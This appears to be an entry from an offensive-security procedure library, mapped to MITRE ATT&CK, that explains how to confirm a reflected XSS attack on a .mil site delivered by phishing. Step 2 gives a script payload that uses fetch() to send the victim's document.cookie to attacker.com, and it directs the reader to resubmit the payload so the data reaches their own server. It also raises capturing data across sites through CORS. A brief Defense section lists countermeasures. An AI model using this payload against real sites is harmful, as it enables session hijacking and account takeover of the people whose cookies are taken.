---
tags:
  - xss
  - exfiltration
  - cookie-theft
  - collection
  - web
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Steal Web Session Cookie]]'
skill_level: beginner
impact_level: high
detection_risk: medium
sub_techniques: []
id: 288b15d6-e784-4f19-9377-c3f68e874e13
created_at: '2025-12-14T00:11:09.349Z'
updated_at: '2025-12-14T00:11:09.349Z'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Observe XSS Execution and Cookie Theft

## Summary

This procedure verifies the success of the reflected XSS by observing JavaScript execution and capturing session cookies, highlighting the potential for broader impacts like token theft across sites via CORS exploitation.

## Description

Following payload injection, this step confirms execution in the victim's browser, where the script accesses `document.cookie` to reveal authentication tokens. On the .mil site, this enables session hijacking; if the victim is authenticated to other domains, CORS misconfigurations allow cross-site data capture. The scenario assumes a phishing-delivered link to the malicious search URL. Outcomes include visible proof-of-concept (alert) and paths to real exfiltration (e.g., via fetch to attacker server).

## Requirements

1. Successful payload injection from previous step
2. Browser with cookies enabled (simulating victim session)
3. Optional: Attacker-controlled server for exfiltration testing

## Defense

Defensive measures and detection strategies:

- Deploy browser-based protections like XSS auditors or extensions (e.g., NoScript)
- Use HttpOnly and Secure flags on cookies to prevent JavaScript access
- Implement CORS policies strictly, logging and blocking unauthorized cross-origin requests
- Scan for XSS with tools like OWASP ZAP and monitor for alert() or exfil patterns in client-side logs

## Objectives

1. Validate arbitrary code execution post-reflection
2. Extract and display sensitive data like cookies
3. Assess escalation potential (e.g., to account takeover)

## Instructions

### Step 1: Monitor for Execution

**Context**: Watch for immediate signs of script runtime in the browser.

**Action** (Observation):

After submission, wait for the page to respond and check for the alert popup.

> If successful, an alert box displays the cookie string (e.g., 'sessionid=abc123; auth=token'). Open browser console (F12) to inspect for errors or executed code.

### Step 2: Analyze and Exfiltrate Data

**Context**: Leverage execution to steal and potentially transmit data.

**Action** (Data Capture):

In the alert, note the cookies. For advanced exploitation, replace alert with:

```
<script>fetch('https://attacker.com/steal?cookies='+document.cookie)</script>
```

Resubmit to send data to your server.

> Expected output: Network tab shows request to attacker domain; server logs incoming cookie data. If CORS allows, this captures from other tabs/sites.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used


## Tools Used

- Web Browser (Developer Tools)

## Tags

- [[xss]]
- [[Exfiltration]]
- [[cookie-theft]]
- [[Collection]]
- [[web]]
